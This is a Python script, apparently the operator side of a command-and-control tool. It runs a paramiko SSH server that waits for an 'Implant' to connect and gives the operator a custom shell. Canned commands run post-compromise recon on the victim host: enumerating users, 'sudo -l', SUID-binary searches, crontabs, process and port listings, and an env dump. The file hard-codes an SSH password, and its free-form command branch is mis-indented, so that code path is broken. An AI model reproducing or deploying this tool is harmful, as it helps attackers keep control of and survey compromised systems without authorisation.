import paramiko
import os
import socket

class sshServer(paramiko.ServerInterface):
    #Determine if a channel request of a given type will be granted, and return OPEN_SUCCEEDED or an error code.
    # This method is called in server mode when the client requests a channel, after authentication is complete.
    def check_channel_request( self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    #Determine if a given username and password supplied by the client is acceptable for use in authentication.
    def check_auth_password(self, username, password):
        if (username == 'sshuser1') and (password == '$$#pa55'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    
    
def main():
    server = '0.0.0.0'
    port = 2222
    #our current working directory
    CWD = os.path.dirname(os.path.realpath(__file__))
    #putting our ssh key in HOSTKEY
    HOSTKEY = paramiko.Ed25519Key(filename=os.path.join(CWD,'id_ed25519'))
    try:
        # we are using IPv4 and TCP connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        sock.bind((server, port))
        sock.listen()
        print('Listening for connections from Implant...')
        client, addr = sock.accept()
    except KeyboardInterrupt:
        quit()
    SSH_session = paramiko.Transport(client)
    SSH_session.add_server_key(HOSTKEY)
    server = sshServer()
    SSH_session.start_server(server=server)
    chan = SSH_session.accept()
    if chan is None:
        print('Transport Error:')
        quit()
    #debug chan output
    print(chan)
    success_messg = chan.recv(1024).decode()
    print(f'{success_messg}')
    chan.send(' ')
    def comm_handler():
        try:
            while True:
                cmd_line = ('ahmadsShell#> ')
                command = input(cmd_line + '')
                if command == "gimi_users":
                    command = "getent passwd | grep -E '/bin/(bash|sh|zsh)' | cut -d: -f1,3,6\n"
                    chan.send(command)
                    ret_value = chan.recv(8192)
                    print(ret_value.decode())
                elif command == "gimi_sysinfo":
                    # Chain kernel details and distro release information
                    command= "uname -a; lsb_release -a\n"
                    chan.send(command) 
                    ret_value = chan.recv(8192)
                    print(ret_value.decode())
                elif command == "gimi_procs":
                     # Detailed running processes
                    command = "ps aux --forest || ps aux\n"
                    chan.send(command) 
                    ret_value = chan.recv(65536)
                    print(ret_value.decode())
                elif command == "gimi_ports":
                     # Detailed running processes
                    command = "ss -tulnp || netstat -tulnp\n"
                    chan.send(command) 
                    ret_value = chan.recv(8192)
                    print(ret_value.decode()) 
                elif command == "gimi_privs":
                    # Checks sudo permissions without prompting for password, and scans for SUID binaries
                    command= "sudo -l -n 2>/dev/null; find / -perm -4000 -type f 2>/dev/null\n"
                    chan.send(command)
                    ret_value = chan.recv(65536)
                    print(ret_value.decode()) 
                elif command == "gimi_cron":
                    # Inspect user crontab and system-wide cron directories
                    command = "crontab -l 2>/dev/null; ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null\n"
                    chan.send(command)
                    ret_value = chan.recv(8192)
                    print(ret_value.decode())  
                elif command == "gimi_env":
                    # Network interfaces, current path, and environment details
                    command = "ip a || ifconfig; pwd; env\n"
                    chan.send(command)
                    ret_value = chan.recv(8192)
                    print(ret_value.decode())                
                    if command == '':
                        comm_handler()
                    else:
                        try:
                            chan.send(command)
                            ret_value = chan.recv(8192)
                            print(ret_value.decode())
                        except SyntaxError:
                            pass
                        
        except Exception as e:
            print(str(e))
        except KeyboardInterrupt:
            quit()
        
    comm_handler()        
        
            
if __name__ == '__main__':
    main()
        